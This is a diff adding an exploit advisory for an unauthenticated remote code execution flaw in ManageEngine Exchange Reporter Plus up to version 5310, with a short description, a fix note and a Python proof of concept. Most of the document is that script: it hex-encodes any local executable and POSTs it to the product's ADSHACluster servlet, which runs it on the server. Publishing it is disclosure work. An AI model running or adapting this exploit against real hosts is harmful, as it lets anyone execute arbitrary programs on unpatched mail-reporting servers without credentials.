@@ -1,0 +1,52 @@
+# Exploit Title: ManageEngine Exchange Reporter Plus <= 5310 Unauthenticated RCE
+# Date: 28-06-2018
+# Software Link: https://www.manageengine.com/products/exchange-reports/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# YouTube: https://www.youtube.com/c/KacperSzurek
+# Category: remote
+ 
+1. Description
+  
+Java servlet `ADSHACluster` executes `bcp.exe` file which can be passed using `BCP_EXE` param.
+
+https://security.szurek.pl/manage-engine-exchange-reporter-plus-unauthenticated-rce.html
+  
+2. Proof of Concept
+
+```python
+import urllib
+
+file_to_execute = "calc.exe"
+ip = "192.168.1.105" 
+
+def to_hex(s):
+    lst = []
+    for ch in s:
+        hv = hex(ord(ch)).replace('0x', '')
+        if len(hv) == 1:
+            hv = '0'+hv
+        lst.append(hv)
+    
+    return reduce(lambda x,y:x+y, lst)
+
+print "ManageEngine Exchange Reporter Plus <= 5310"
+print "Unauthenticated Remote Code Execution"
+print "by Kacper Szurek"
+print "https://security.szurek.pl/"
+print "https://twitter.com/KacperSzurek"
+print "https://www.youtube.com/c/KacperSzurek"
+
+params = urllib.urlencode({'MTCALL': "nativeClient", "BCP_RLL" : "0102", 'BCP_EXE': to_hex(open(file_to_execute, "rb").read())})
+f = urllib.urlopen("http://{}:8181/exchange/servlet/ADSHACluster".format(ip), params)
+if '{"STATUS":"error"}' in f.read():
+	print "OK"
+else:
+	print "ERROR"
+```
+
+3. Solution:
+   
+Update to version 5311
+https://www.manageengine.com/products/exchange-reports/release-notes.html
